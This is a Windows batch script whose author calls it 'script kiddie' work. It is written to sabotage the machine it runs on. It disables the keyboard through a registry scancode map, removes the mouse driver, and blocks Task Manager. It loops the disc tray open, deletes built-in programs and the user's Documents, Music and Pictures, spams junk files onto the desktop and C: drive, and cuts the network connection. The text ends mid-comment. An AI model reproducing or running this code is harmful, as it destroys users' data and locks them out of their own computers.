@echo off
echo i was script kiddie back then please don't mind me
echo run as admin if running as admin ok............
::------Disable Keyboard-----::
echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> "nokeyboard.reg"
echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> "nokeyboard.reg"
echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> "nokeyboard.reg"
echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> "nokeyboard.reg"
echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> "nokeyboard.reg"
echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> "nokeyboard.reg"
echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> "nokeyboard.reg"
echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> "nokeyboard.reg"
echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> "nokeyboard.reg"
echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> "nokeyboard.reg"
echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> "nokeyboard.reg"
echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> "nokeyboard.reg"
echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> "nokeyboard.reg"
echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> "nokeyboard.reg"
echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> "nokeyboard.reg"
echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> "nokeyboard.reg"
echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> "nokeyboard.reg"
echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> "nokeyboard.reg"
echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
start nokeyboard.reg
::---------------------------::
::-------Disable Mouse-------::
set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"
reg delete %key%
reg add %key% /v Start /t REG_DWORD /d 4
::---------------------------::
::---Disable Taskmanager-----::
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
::---------------------------::
::-------Open Disk Tray------::
echo Do >> "opendisk.vbs"
echo Set oWMP = CreateObject("WMPlayer.OCX.7" ) >> "opendisk.vbs"
echo Set colCDROMs = oWMP.cdromCollection >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo colCDROMs.Item(d).Eject  >> "opendisk.vbs"
echo Loop >> "opendisk.vbs"
start "" "opendisk.vbs"
::---------------------------::
::---Disable Taskmanager-----::
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
::---------------------------::
::-------Delete MS Paint-----::
del /f /q "mspaint.exe"
::---------------------------::
::-----Delete My Music-------::
del /f /q "C:\Users\%userprofile%\My Documents\My Music\*.*"
::---------------------------::
::--Delete Internet Explorer-::
del /f /q "C:\Program Files\Internet Explorer\iexplore.exe"
::---------------------------::
::--------Delete Calc.-------::
del /f /q "calc.exe"
::---------------------------::
::--Delete Windows Live Mail-::
del /f /q "wlmail.exe"
::---------------------------::
::-------Delete Notepad------::
del /f /q "notepad.exe"
::---------------------------::
::-------Delete Wordpad------::
del /f /q "WordPad.exe"
::---------------------------::
::-----Delete My Pictures----::
del /f /q "C:\Users\%userprofile%\My Documents\My Pictures\*.*"
::---------------------------::
::----Delete My Documents----::
del /f /q "C:\Users\%userprofile%\My Documents\*.*"
::---------------------------::
::-------Spam Desktop--------::
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
echo %random% > "%userprofile%\Desktop\%random%Spammed Filetype"
::---------------------------::
::-------Spam C Drive--------::
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
echo %random% > "C:\%random%Spammed Filetype"
::---------------------------::
::-----Disable Internet------::
ipconfig /release
if ERRORLEVEL1 ipconfig /release_all
::--------
